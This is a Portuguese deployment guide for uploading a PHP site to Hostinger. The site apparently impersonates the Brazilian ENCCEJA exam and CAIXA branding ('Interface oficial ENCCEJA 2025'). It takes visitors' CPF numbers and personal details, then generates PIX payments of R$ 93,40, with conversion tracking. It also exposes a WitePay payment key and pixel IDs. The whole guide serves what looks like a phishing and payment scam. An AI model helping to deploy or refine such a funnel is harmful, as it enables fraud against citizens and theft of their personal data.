# Upload para Hostinger via MobaXterm (ou FTP)

## Pré-requisitos
- Conta ativa na Hostinger
- MobaXterm instalado (ou qualquer cliente FTP/SFTP)
- Arquivo `encceja-hostinger-funil-completo.zip` baixado

## Passo 1: Obter Dados de Acesso FTP

### Via hPanel da Hostinger:
1. Faça login no hPanel da Hostinger
2. Vá em **Hosting** → **Gerenciar** (do seu domínio)
3. Procure por **Arquivos** → **Gerenciador de Arquivos** ou **FTP**
4. Anote os dados:
   - **Host/Servidor**: geralmente `ftp.seudominio.com` ou IP do servidor
   - **Usuário**: seu usuário FTP (pode ser o mesmo do cPanel)
   - **Senha**: sua senha FTP
   - **Porta**: 21 (FTP) ou 22 (SFTP)

## Passo 2: Configurar MobaXterm

### Criar Nova Sessão:
1. Abra MobaXterm
2. Clique em **Session** → **New Session**
3. Escolha **FTP** ou **SFTP** (recomendado)
4. Configure:
   ```
   Remote host: ftp.seudominio.com (ou IP fornecido)
   Username: seu_usuario_ftp
   Port: 21 (FTP) ou 22 (SFTP)
   ```
5. Clique **OK** e digite a senha quando solicitado

## Passo 3: Navegar para public_html

### No MobaXterm:
1. Após conectar, navegue pelo painel lateral direito (servidor)
2. Procure a pasta **public_html** ou **www** ou **htdocs**
3. Entre nesta pasta (é onde ficam os arquivos do site)

## Passo 4: Upload dos Arquivos

### Método 1 - Upload do ZIP + Extração:
1. **Upload**: Arraste o arquivo `encceja-hostinger-funil-completo.zip` para `public_html`
2. **Via Gerenciador de Arquivos web**:
   - Vá no hPanel → Gerenciador de Arquivos
   - Navegue até `public_html`
   - Clique com botão direito no ZIP → **Extrair**
   - Delete o arquivo ZIP após extrair

### Método 2 - Upload Direto (Recomendado):
1. **Extraia localmente** o ZIP no seu computador
2. **No MobaXterm**, arraste todos os arquivos da pasta extraída para `public_html`:
   ```
   public_html/
   ├── index.php
   ├── .htaccess
   ├── INSTALACAO_PHP.txt
   └── static/
       ├── css/output.css
       └── fonts/
   ```

## Passo 5: Configurar Permissões

### Via MobaXterm ou cPanel:
- **Arquivos PHP**: 644
- **Pastas**: 755
- **.htaccess**: 644

### Comando via terminal (se disponível):
```bash
chmod -R 644 public_html/*.php
chmod -R 755 public_html/static/
chmod 644 public_html/.htaccess
```

## Passo 6: Testar

### Acesse seu site:
1. **Homepage**: `https://seudominio.com/`
2. **Teste o funil**:
   - Digite um CPF válido (ex: 11122233344)
   - Navegue pelas páginas
   - Teste geração de PIX

### URLs funcionais:
- `/` - Página inicial (consulta CPF)
- `/?page=encceja_info` - Dados encontrados
- `/?page=dados_pessoais` - Confirmar dados
- `/?page=pagamento` - Gerar PIX
- `/?webhook=witepay` - Webhook (para WitePay)

## Estrutura Final no Servidor

```
public_html/
├── index.php                 # Aplicação principal
├── .htaccess                # Configurações do servidor
├── INSTALACAO_PHP.txt       # Documentação
└── static/
    ├── css/
    │   └── output.css       # Estilos Tailwind
    └── fonts/
        ├── CAIXAStd-Bold.woff
        ├── CAIXAStd-Book.woff
        └── CAIXAStd-SemiBold.woff
```

## Solução de Problemas

### Erro 500:
- Verifique permissões dos arquivos
- Confirme se PHP está habilitado
- Verifique logs de erro no cPanel

### CSS não carrega:
- Confirme estrutura da pasta `static/`
- Verifique permissões da pasta

### PIX não gera:
- Chave WitePay já está configurada no código
- Verifique logs de erro no navegador (F12)

## Chaves Já Configuradas

O sistema já vem com todas as chaves necessárias:
- **WitePay**: wtp_7819b0bb469f4b52a96feca4ddc46ba4
- **Google Pixel**: 6859ccee5af20eab22a408ef
- **Facebook Pixels**: 3 pixels configurados

## Conclusão

Após o upload, seu funil ENCCEJA estará online imediatamente!
- Funil completo: Home → Info → Dados → Pagamento
- PIX funcionais de R$ 93,40
- Tracking de conversões ativo
- Interface oficial ENCCEJA 2025